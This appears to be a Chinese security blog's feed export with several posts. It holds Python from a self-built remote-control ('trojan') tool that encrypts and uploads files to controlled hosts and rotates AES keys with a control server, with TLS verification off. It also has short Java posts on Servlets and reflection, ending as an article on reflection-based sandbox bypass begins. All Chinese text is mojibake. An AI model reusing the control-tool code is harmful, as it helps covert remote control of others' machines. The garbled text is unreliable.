çš„æ–‡ä»¶æ˜¯å¦å­˜åœ¨</span></span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;æ–‡ä»¶ä¸å­˜åœ¨ï¼&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span> -<span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> targetfilepath.strip()[-<span class="number">1</span>] != <span class="string">&quot;/&quot;</span>:  <span class="comment"># åˆ¤æ–­ç›®æ ‡è·¯å¾„æ˜¯å¦ç¬¦åˆ /ç›®å½•/ æ ¼å¼</span></span><br><span class="line">            targetfilepath += <span class="string">&quot;/&quot;</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># è¯·æ±‚æœåŠ¡å™¨å¼€å¯æ–‡ä»¶ä»£ç†ä¼ è¾“æœåŠ¡</span></span><br><span class="line">        random_port = <span class="variable language_">self</span>.openfileserver()</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> random_port:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;æ–‡ä»¶æœåŠ¡å¼€å¯å¤±è´¥ï¼&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span> -<span class="number">1</span></span><br><span class="line"></span><br><span class="line">        <span class="variable language_">self</span>.sendcmd(host_key, <span class="string">&quot;uploadfile&quot;</span>, port=random_port)  <span class="comment"># å‘æœåŠ¡å™¨å‘å¸ƒä»»åŠ¡</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;å‘å¸ƒä»»åŠ¡ï¼\næ­£åœ¨ç­‰å¾…æœ¨é©¬ç«¯è¿æ¥...&quot;</span>)</span><br><span class="line">        sleep(<span class="number">2</span>)  <span class="comment"># ç­‰å¾…ä¸¤ç§’ä»¥ç¡®ä¿æ–‡ä»¶æœåŠ¡å™¨å¯åŠ¨</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># å¼€å§‹æ–‡ä»¶ä¼ è¾“</span></span><br><span class="line">        s = socket.socket()</span><br><span class="line">        s.connect((LOCAL_IP, random_port))</span><br><span class="line">        s.send(<span class="string">&quot;c&quot;</span>.encode(<span class="string">&quot;utf-8&quot;</span>))  <span class="comment"># å‘æ–‡ä»¶ä¼ è¾“ä»£ç†æœåŠ¡å‘é€èº«ä»½æ ‡è¯†ï¼Œc è¡¨ç¤ºæˆ‘æ˜¯æ–‡ä»¶å‘é€æ–¹</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># åŠ å¯†æ–‡ä»¶å‡†å¤‡</span></span><br><span class="line">        encrypted_filepath = filepath + <span class="string">&quot;.enc&quot;</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">with</span> <span class="built_in">open</span>(filepath, <span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> original_file:</span><br><span class="line">                original_data = original_file.read()</span><br><span class="line">            encrypted_data = FileCrypto.encrypt(original_data, host_key)  <span class="comment"># ä½¿ç”¨å¯¹åº”çš„å¯†é’¥è¿›è¡ŒåŠ å¯†</span></span><br><span class="line">            <span class="keyword">with</span> <span class="built_in">open</span>(encrypted_filepath, <span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> encrypted_file:</span><br><span class="line">                encrypted_file.write(encrypted_data)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;æ–‡ä»¶åŠ å¯†å®Œæˆï¼Œä¿å­˜è·¯å¾„ï¼š<span class="subst">&#123;encrypted_filepath&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;æ–‡ä»¶åŠ å¯†å¤±è´¥ï¼š<span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line">            s.close()</span><br><span class="line">            <span class="keyword">return</span> -<span class="number">1</span></span><br><span class="line"></span><br><span class="line">        filename = basename(encrypted_filepath)  <span class="comment"># è·å–åŠ å¯†æ–‡ä»¶çš„åç§°</span></span><br><span class="line">        filesize = getsize(encrypted_filepath)  <span class="comment"># è·å–åŠ å¯†æ–‡ä»¶çš„å¤§å°</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># æ¥æ”¶æ–‡ä»¶æœåŠ¡å™¨å‘æ¥çš„å¯¹æ¥æˆåŠŸä¿¡æ¯</span></span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            data = s.recv(<span class="number">1024</span>)</span><br><span class="line">            <span class="keyword">if</span> data:</span><br><span class="line">                isok = loads(data.decode(<span class="string">&quot;utf-8&quot;</span>))  <span class="comment"># &#123;&quot;info&quot;:yes&#125;</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">isinstance</span>(isok, <span class="built_in">dict</span>) <span class="keyword">and</span> isok.get(<span class="string">&quot;info&quot;</span>) == <span class="string">&quot;yes&quot;</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;å¯¹æ¥æˆåŠŸï¼æ­£åœ¨ä¸Šä¼ åŠ å¯†æ–‡ä»¶...&quot;</span>)</span><br><span class="line">            <span class="comment"># æ–‡ä»¶å¤´éƒ¨ä¿¡æ¯ï¼š&#123;&quot;filename&quot;:æ–‡ä»¶åç§°,&quot;filesize&quot;:æ–‡ä»¶å¤§å°,&quot;filewritedir&quot;:è¦å†™å…¥çš„ç›®æ ‡è·¯å¾„&#125;</span></span><br><span class="line">            filehead = &#123;<span class="string">&quot;filename&quot;</span>: filename, <span class="string">&quot;filesize&quot;</span>: filesize, <span class="string">&quot;filewritedir&quot;</span>: targetfilepath&#125;</span><br><span class="line">            s.send(dumps(&#123;<span class="string">&quot;whoami&quot;</span>: <span class="string">&quot;c&quot;</span>, <span class="string">&quot;data&quot;</span>: <span class="built_in">str</span>(b64encode(dumps(filehead).encode(<span class="string">&quot;utf-8&quot;</span>)))&#125;).encode(<span class="string">&quot;utf-8&quot;</span>))</span><br><span class="line">            sleep(<span class="number">1</span>)</span><br><span class="line">            data = &#123;<span class="string">&quot;whoami&quot;</span>: <span class="string">&quot;c&quot;</span>, <span class="string">&quot;data&quot;</span>: <span class="string">&quot;senddata&quot;</span>&#125;</span><br><span class="line">            s.send(dumps(data).encode(<span class="string">&quot;utf-8&quot;</span>))  <span class="comment"># å‘é€å°±ç»ªä¿¡å·åˆ°æ¥æ”¶ç«¯</span></span><br><span class="line"></span><br><span class="line">            <span class="comment"># ä¸Šä¼ åŠ å¯†æ–‡ä»¶</span></span><br><span class="line">            <span class="keyword">with</span> <span class="built_in">open</span>(encrypted_filepath, <span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> fp:</span><br><span class="line">                <span class="keyword">while</span> filesize &gt; <span class="number">0</span>:</span><br><span class="line">                    chunk = fp.read(<span class="number">1024</span>)</span><br><span class="line">                    filesize -= <span class="built_in">len</span>(chunk)</span><br><span class="line">                    s.sendall(chunk)</span><br><span class="line">                    <span class="keyword">if</span> filesize == <span class="number">0</span>:</span><br><span class="line">                        <span class="built_in">print</span>(<span class="string">&quot;åŠ å¯†æ–‡ä»¶ä¸Šä¼ å®Œæˆï¼&quot;</span>)</span><br><span class="line">                        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># æ¥æ”¶å¯¹ç«¯çš„é€€å‡ºä¿¡æ¯</span></span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            data = s.recv(<span class="number">1024</span>)</span><br><span class="line">            <span class="keyword">if</span> data:</span><br><span class="line">                data = data.decode(<span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line">                <span class="keyword">if</span> data == <span class="string">&quot;exit&quot;</span>:</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">&quot;æ–‡ä»¶ä¸Šä¼ æˆåŠŸï¼&quot;</span>)</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># å‘æ–‡ä»¶æœåŠ¡å™¨å‘é€é€€å‡ºä¿¡æ¯</span></span><br><span class="line">        s.send(dumps(&#123;<span class="string">&quot;whoami&quot;</span>: <span class="string">&quot;exit&quot;</span>&#125;).encode(<span class="string">&quot;utf-8&quot;</span>))</span><br><span class="line">        s.close()</span><br><span class="line"></span><br><span class="line">        <span class="comment"># åˆ é™¤åŠ å¯†æ–‡ä»¶</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">from</span> os <span class="keyword">import</span> remove</span><br><span class="line">            remove(encrypted_filepath)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;ä¸´æ—¶åŠ å¯†æ–‡ä»¶å·²åˆ é™¤ï¼š<span class="subst">&#123;encrypted_filepath&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;åˆ é™¤åŠ å¯†æ–‡ä»¶å¤±è´¥ï¼š<span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span></span><br></pre></td></tr></table></figure><h2 id="åŠ¨æ€å¯†é’¥"><a href="#åŠ¨æ€å¯†é’¥" class="headerlink" title="åŠ¨æ€å¯†é’¥"></a>åŠ¨æ€å¯†é’¥</h2><p>åŠ¨æ€å¯†é’¥ç”±è¢«æ§ç«¯ä¸»åŠ¨å‘èµ· æ¯éš”ä¸€æ®µæ—¶é—´éƒ½éœ€è¦ä¸»åŠ¨æ›´æ–°å¯†é’¥ ç”¨åˆå§‹å¯†é’¥åŠ å¯†å½“å‰æ›´æ–°åçš„å¯†é’¥åå‘é€ç»™æœåŠ¡ç«¯ æœåŠ¡ç«¯æ›´æ–°ä»»åŠ¡å¯†é’¥ç­‰ä¿¡æ¯ åŒæ—¶æ§åˆ¶ç«¯ä»£ç ä¹Ÿéœ€è¦æ›´æ–° åœ¨æ¯æ¬¡æ“ä½œä¹‹å‰éƒ½è·å–è¢«æ§ç«¯çš„æœ€æ–°å¯†é’¥</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">update_aes_key</span>(<span class="params">self, key: <span class="built_in">str</span>, aes_key: <span class="built_in">str</span></span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        æè¿°ï¼š</span></span><br><span class="line"><span class="string">          å®¢æˆ·ç«¯ç”Ÿæˆæ–°çš„ AES å¯†é’¥å¹¶å‘ŠçŸ¥æœåŠ¡ç«¯ã€‚</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        å‚æ•°ï¼š</span></span><br><span class="line"><span class="string">          key: å½“å‰å®¢æˆ·ç«¯çš„å”¯ä¸€æ ‡è¯†ã€‚</span></span><br><span class="line"><span class="string">          aes_key: å½“å‰ AES åŠ å¯†å¯†é’¥ã€‚</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        è¿”å›ï¼š</span></span><br><span class="line"><span class="string">          æ›´æ–°æˆåŠŸè¿”å›æ–° AES å¯†é’¥ï¼Œå¤±è´¥è¿”å› &quot;error&quot;ã€‚</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="comment"># ç”Ÿæˆæ–° AES å¯†é’¥</span></span><br><span class="line">            new_aes_key = md5((<span class="built_in">str</span>((randint(<span class="number">1</span>, <span class="number">65535</span>))) + <span class="string">&quot;pkcn&quot;</span>).encode(<span class="string">&quot;utf-8&quot;</span>)).hexdigest()[:<span class="number">16</span>]</span><br><span class="line">            signature = DataAesCrypt(aes_key, key).encrypt()  <span class="comment"># ä½¿ç”¨å½“å‰ AES å¯†é’¥åŠ å¯†å®¢æˆ·ç«¯å”¯ä¸€æ ‡è¯†</span></span><br><span class="line"></span><br><span class="line">            <span class="comment"># å‘æœåŠ¡ç«¯å‘é€æ›´æ–°è¯·æ±‚</span></span><br><span class="line">            url = <span class="string">&quot;https://&quot;</span> + IP + <span class="string">&quot;:&quot;</span> + <span class="built_in">str</span>(PORT) + <span class="string">&quot;/updatekey&quot;</span></span><br><span class="line">            payload = &#123;</span><br><span class="line">                <span class="string">&quot;key&quot;</span>: key,</span><br><span class="line">                <span class="string">&quot;new_aes_key&quot;</span>: new_aes_key,</span><br><span class="line">                <span class="string">&quot;signature&quot;</span>: signature</span><br><span class="line">            &#125;</span><br><span class="line">            rst = post(url=url, json=payload, timeout=<span class="number">5</span>, verify=<span class="literal">False</span>)</span><br><span class="line">            <span class="keyword">if</span> rst.status_code == <span class="number">200</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;AES å¯†é’¥æ›´æ–°æˆåŠŸï¼&quot;</span>)</span><br><span class="line">                <span class="keyword">return</span> new_aes_key</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;AES å¯†é’¥æ›´æ–°å¤±è´¥ï¼š&quot;</span>, rst.text)</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&quot;error&quot;</span></span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;æ›´æ–° AES å¯†é’¥æ—¶å‘ç”Ÿé”™è¯¯ï¼š<span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;error&quot;</span></span><br></pre></td></tr></table></figure><h2 id="æ–‡ä»¶åŠ å¯†"><a href="#æ–‡ä»¶åŠ å¯†" class="headerlink" title="æ–‡ä»¶åŠ å¯†"></a>æ–‡ä»¶åŠ å¯†</h2><p>å°è¯•è¿›è¡Œæµå¼åŠ å¯†å‘ç°å¤ªéº»çƒ¦äº† ç›´æ¥å°†æ–‡ä»¶æ•´ä¸ªåŠ å¯†æˆæ–°æ–‡ä»¶ä¹‹åä¼ è¾“æ–°æ–‡ä»¶</p><h2 id="sockets-ä»£ç†"><a href="#sockets-ä»£ç†" class="headerlink" title="sockets ä»£ç†"></a>sockets ä»£ç†</h2><p>è¿™å—ä¸»è¦å°±æ˜¯ç»´æŠ¤ç›¸åº”çš„é“¾æ¥</p>]]></content>
      
      
      <categories>
          
          <category> Tools </category>
          
      </categories>
      
      
        <tags>
            
            <tag> burpsuite </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ã€Javaä»£ç å®¡è®¡ã€‘Java Servlet</title>
      <link href="/2024/11/12/WebSecurity/codeaudit/javaservlet/"/>
      <url>/2024/11/12/WebSecurity/codeaudit/javaservlet/</url>
      
        <content type="html"><![CDATA[<p><img src="/2024/11/12/WebSecurity/codeaudit/javaservlet/image.png" alt="Servleté…ç½®åŸºäºWeb.xml"><br><img src="/2024/11/12/WebSecurity/codeaudit/javaservlet/image-1.png" alt="Servleté…ç½®åŸºäºæ³¨è§£æ–¹å¼"><br><img src="/2024/11/12/WebSecurity/codeaudit/javaservlet/image-2.png" alt="Servleté…ç½®åŸºäºæ³¨è§£æ–¹å¼"><br><img src="/2024/11/12/WebSecurity/codeaudit/javaservlet/image-3.png" alt="Servletå·¥ä½œæµç¨‹"><br><img src="/2024/11/12/WebSecurity/codeaudit/javaservlet/image-4.png" alt="Servlet initæ¥å£"><br><img src="/2024/11/12/WebSecurity/codeaudit/javaservlet/image-5.png" alt="Servlet serviceæ¥å£"></p>]]></content>
      
      
      <categories>
          
          <category> Code Audit </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java </tag>
            
            <tag> ä»£ç å®¡è®¡ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ã€Javaå¼€å‘ã€‘javaç›¸å…³çš„å°çŸ¥è¯†ç‚¹</title>
      <link href="/2024/11/12/code/javacode/"/>
      <url>/2024/11/12/code/javacode/</url>
      
        <content type="html"><![CDATA[<h2 id="å€¼ä¼ é€’å’Œå¼•ç”¨ä¼ é€’"><a href="#å€¼ä¼ é€’å’Œå¼•ç”¨ä¼ é€’" class="headerlink" title="å€¼ä¼ é€’å’Œå¼•ç”¨ä¼ é€’"></a>å€¼ä¼ é€’å’Œå¼•ç”¨ä¼ é€’</h2><p>Java æœ‰ 8 ç§åŸºæœ¬æ•°æ®ç±»å‹ï¼Œåˆ†åˆ«æ˜¯ intã€longã€byteã€shortã€floatã€double ã€char å’Œ boolean</p><ul><li>Java ä¸­çš„å‚æ•°ä¼ é€’æ˜¯æŒ‰å€¼ä¼ é€’çš„ã€‚</li><li>å¦‚æœå‚æ•°æ˜¯åŸºæœ¬ç±»å‹ï¼Œä¼ é€’çš„æ˜¯åŸºæœ¬ç±»å‹çš„å­—é¢é‡å€¼çš„æ‹·è´ã€‚</li><li>å¦‚æœå‚æ•°æ˜¯å¼•ç”¨ç±»å‹ï¼Œä¼ é€’çš„æ˜¯å¼•ç”¨çš„å¯¹è±¡åœ¨å †ä¸­åœ°å€çš„æ‹·è´ã€‚</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">ReferenceTypeDemo</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> <span class="string">&quot;äºŒå“¥&quot;</span>;</span><br><span class="line">        modify(name);</span><br><span class="line">        System.out.println(name);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">modify</span><span class="params">(String name1)</span> &#123;</span><br><span class="line">        name1 = <span class="string">&quot;ä¸‰å¦¹&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åœ¨ Java ä¸­ï¼Œ<code>String</code> æ˜¯ä¸å¯å˜çš„ï¼ˆimmutableï¼‰ã€‚å½“ä½ æŠŠ <code>name</code> å˜é‡ä¼ é€’ç»™ <code>modify</code> æ–¹æ³•æ—¶ï¼Œå®é™…ä¸Šæ˜¯å°† <code>name</code> çš„å€¼ï¼ˆå³å­—ç¬¦ä¸² <code>&quot;äºŒå“¥&quot;</code>)çš„å¼•ç”¨å¤åˆ¶ç»™äº† <code>modify</code> æ–¹æ³•ä¸­çš„å‚æ•° <code>name1</code>ã€‚å› æ­¤ï¼Œ<code>name1</code> å’Œ <code>name</code> éƒ½æŒ‡å‘ <code>&quot;äºŒå“¥&quot;</code> è¿™ä¸ªå­—ç¬¦ä¸²ã€‚<br>åœ¨ <code>modify</code> æ–¹æ³•ä¸­ï¼Œ<code>name1 = &quot;ä¸‰å¦¹&quot;;</code> åªæ˜¯å°† <code>name1</code> å˜é‡æŒ‡å‘äº†ä¸€ä¸ªæ–°çš„å­—ç¬¦ä¸² <code>&quot;ä¸‰å¦¹&quot;</code>ï¼Œå¹¶æ²¡æœ‰æ”¹å˜åŸæ¥çš„ <code>name</code> å˜é‡çš„å†…å®¹ã€‚<code>name</code> ä»ç„¶æŒ‡å‘ <code>&quot;äºŒå“¥&quot;</code>ï¼Œå› æ­¤åœ¨ <code>main</code> æ–¹æ³•ä¸­è¾“å‡º <code>name</code> æ—¶ï¼Œä»ç„¶ä¼šè¾“å‡º <code>&quot;äºŒå“¥&quot;</code>ã€‚</p><h2 id="Javaåå°„"><a href="#Javaåå°„" class="headerlink" title="Javaåå°„"></a>Javaåå°„</h2><ul><li>å¼€å‘é€šç”¨æ¡†æ¶ï¼šåƒ Springï¼Œä¸ºäº†ä¿æŒé€šç”¨æ€§ï¼Œé€šè¿‡é…ç½®æ–‡ä»¶æ¥åŠ è½½ä¸åŒçš„å¯¹è±¡ï¼Œè°ƒç”¨ä¸åŒçš„æ–¹æ³•ã€‚</li><li>åŠ¨æ€ä»£ç†ï¼šåœ¨é¢å‘åˆ‡é¢ç¼–ç¨‹ä¸­ï¼Œéœ€è¦æ‹¦æˆªç‰¹å®šçš„æ–¹æ³•ï¼Œå°±ä¼šé€‰æ‹©åŠ¨æ€ä»£ç†çš„æ–¹å¼ï¼Œè€ŒåŠ¨æ€ä»£ç†çš„åº•å±‚æŠ€æœ¯å°±æ˜¯åå°„ã€‚</li><li>æ³¨è§£ï¼šæ³¨è§£æœ¬èº«åªæ˜¯èµ·åˆ°ä¸€ä¸ªæ ‡è®°ç¬¦çš„ä½œç”¨ï¼Œå®ƒéœ€è¦åˆ©ç”¨å‘å°„æœºåˆ¶ï¼Œæ ¹æ®æ ‡è®°ç¬¦å»æ‰§è¡Œç‰¹å®šçš„è¡Œä¸ºã€‚<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ReflectionDemo1</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ClassNotFoundException, NoSuchMethodException, IllegalAccessException, InvocationTargetException, InstantiationException &#123;</span><br><span class="line">        <span class="type">Writer</span> <span class="variable">writer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Writer</span>();</span><br><span class="line">        writer.setName(<span class="string">&quot;æ²‰é»˜ç‹äºŒ&quot;</span>);</span><br><span class="line">        System.out.println(writer.getName());</span><br><span class="line"></span><br><span class="line">        <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;com.itwanger.s39.Writer&quot;</span>);</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">constructor</span> <span class="operator">=</span> clazz.getConstructor();</span><br><span class="line">        <span class="type">Object</span> <span class="variable">object</span> <span class="operator">=</span> constructor.newInstance();</span><br><span class="line"></span><br><span class="line">        <span class="type">Method</span> <span class="variable">setNameMethod</span> <span class="operator">=</span> clazz.getMethod(<span class="string">&quot;setName&quot;</span>, String.class);</span><br><span class="line">        setNameMethod.invoke(object, <span class="string">&quot;æ²‰é»˜ç‹äºŒ&quot;</span>);</span><br><span class="line">        <span class="type">Method</span> <span class="variable">getNameMethod</span> <span class="operator">=</span> clazz.getMethod(<span class="string">&quot;getName&quot;</span>);</span><br><span class="line">        System.out.println(getNameMethod.invoke(object));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul>]]></content>
      
      
      <categories>
          
          <category> Code </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ã€ä»£ç å®¡è®¡ã€‘Javaä»£ç å®¡è®¡åå°„ç¯‡</title>
      <link href="/2024/11/12/WebSecurity/codeaudit/javasec/"/>
      <url>/2024/11/12/WebSecurity/codeaudit/javasec/</url>
      
        <content type="html"><![CDATA[<p>ã€ŒJavaå®‰å…¨ã€<a href="https://pan.quark.cn/s/56c5a74545e7">https://pan.quark.cn/s/56c5a74545e7</a><br>Javaçš„å®‰å…¨é—®é¢˜å¸¸å¸¸ä»ååºåˆ—åŒ–æ¼æ´è°ˆèµ·ï¼Œè€Œååºåˆ—åŒ–æ¼æ´åˆä¸åå°„ç´§å¯†ç›¸å…³ã€‚åå°„æ˜¯Javaä¸­çš„ä¸€ä¸ªå¼ºå¤§åŠŸèƒ½ï¼Œå®ƒå…è®¸ç¨‹åºåœ¨è¿è¡Œæ—¶åŠ¨æ€åœ°åŠ è½½ç±»ã€è°ƒç”¨æ–¹æ³•ã€è®¿é—®å­—æ®µç­‰ã€‚é€šè¿‡åå°„ï¼ŒJavaèƒ½å¤Ÿå°†è¿™ç§é™æ€è¯­è¨€èµ‹äºˆåŠ¨æ€ç‰¹æ€§ã€‚<br>â€œåŠ¨æ€ç‰¹æ€§â€æ˜¯æŒ‡ä»£ç åœ¨è¿è¡Œæ—¶å¯ä»¥æ”¹å˜å…¶è¡Œä¸ºã€‚ä¾‹å¦‚ï¼Œé€šè¿‡æ”¹å˜ä»£ç ä¸­çš„æŸäº›å˜é‡ï¼Œå¯èƒ½ä¼šå¯¼è‡´ä»£ç çš„æ‰§è¡Œç»“æœå‘ç”Ÿå˜åŒ–ã€‚è™½ç„¶Javaä¸åƒPHPé‚£æ ·çµæ´»ï¼Œä½†é€šè¿‡åå°„ï¼ŒJavaä¹Ÿèƒ½å¤Ÿæä¾›ä¸€å®šçš„åŠ¨æ€ç‰¹æ€§ã€‚<br>åå°„åœ¨å®‰å…¨ç ”ç©¶ä¸­å¸¸ç”¨äºç»•è¿‡æ²™ç›’ï¼ˆå¦‚é™åˆ¶æŸäº›ç±»çš„è®¿é—®ï¼‰ã€‚ä¾‹å¦‚ï¼Œé€šè¿‡åå°„å¯ä»¥ç»•è¿‡è¾“å…¥é™åˆ¶æ¥åŠ è½½å¹¶æ‰§è¡Œæ½œåœ¨å±é™©çš„ç±»ã€‚å‡è®¾ä½ åªèƒ½è·å–ä¸€ä¸ª<code>Integer</code>ç±»å‹çš„è¾“å…¥ï¼Œä½†å¯ä»¥åˆ©ç”¨åå°„åŠ è½½å¹¶æ‰§è¡Œ<code>Runtime</code>ç±»ä¸­çš„å‘½ä»¤ã€‚</p><p><img src="/2024/11/12/WebSecurity/codeaudit/javasec/image-7.png"></p><h2 id="ç¬¬ä¸€éƒ¨åˆ†"><a href="#ç¬¬ä¸€éƒ¨åˆ†" class="headerlink" title="ç¬¬ä¸€éƒ¨åˆ†"></a>ç¬¬ä¸€éƒ¨åˆ†</h2><h3 id="åå°„çš„æ ¸å¿ƒåŠŸèƒ½"><a href="#åå°„çš„æ ¸å¿ƒåŠŸèƒ½" class="headerlink" title="åå°„çš„æ ¸å¿ƒåŠŸèƒ½"></a>åå°„çš„æ ¸å¿ƒåŠŸèƒ½</h3><p>åå°„æ˜¯é€šè¿‡ä»¥ä¸‹å‡ ç§æ–¹æ³•å®ç°çš„ï¼š</p><ol><li><p><strong>è·å–ç±»</strong>ï¼š</p><ul><li><code>Class.forName(className)</code>ï¼šé€šè¿‡ç±»ååŠ è½½ç±»ã€‚</li><li><code>obj.getClass()</code>ï¼šé€šè¿‡å·²å®ä¾‹åŒ–å¯¹è±¡æ¥è·å–å…¶ç±»ã€‚</li><li><code>Test.class</code>ï¼šå¦‚æœç±»å·²ç»åŠ è½½ï¼Œå¯ä»¥ç›´æ¥é€šè¿‡<code>.class</code>å±æ€§æ¥è·å–ã€‚</li></ul></li><li><p><strong>å®ä¾‹åŒ–å¯¹è±¡</strong>ï¼š</p><ul><li><code>clazz.newInstance()</code>ï¼šé€šè¿‡åå°„åˆ›å»ºç±»çš„å®ä¾‹ã€‚</li></ul></li><li><p><strong>è·å–æ–¹æ³•å¹¶æ‰§è¡Œ</strong>ï¼š</p><ul><li><code>clazz.getMethod(methodName)</code>ï¼šé€šè¿‡åå°„è·å–ç±»ä¸­çš„æ–¹æ³•ã€‚</li><li><code>method.invoke(clazz.newInstance())</code>ï¼šè°ƒç”¨è·å–åˆ°çš„æ–¹æ³•ã€‚</li></ul></li></ol><p><code>Class.forName</code> çš„è¯¦ç»†è§£æ<br><code>Class.forName</code>æ–¹æ³•æœ‰ä¸¤ä¸ªé‡è½½ç‰ˆæœ¬ï¼š</p><ul><li><code>Class&lt;?&gt; forName(String name)</code>ï¼šæ ¹æ®ç±»ååŠ è½½ç±»ã€‚</li><li><code>Class&lt;?&gt; forName(String name, boolean initialize, ClassLoader loader)</code>ï¼šåŒæ ·åŠ è½½ç±»ï¼Œä½†å¯ä»¥æŒ‡å®šæ˜¯å¦åˆå§‹åŒ–ç±»ï¼Œå¹¶é€šè¿‡æŒ‡å®š<code>ClassLoader</code>æ¥åŠ è½½ç±»ã€‚</li></ul><p>ç¬¬â¼†ä¸ªå‚æ•° initialize å¸¸å¸¸è¢«â¼ˆäººè¯¯è§£ï¼Œæˆ‘çœ‹åˆ°å‹¾é™ˆå®‰å…¨å®éªŒå®¤æœ‰ç¯‡è®²åå°„æœºåˆ¶çš„â½‚æ–‡ç« ï¼ˆ<a 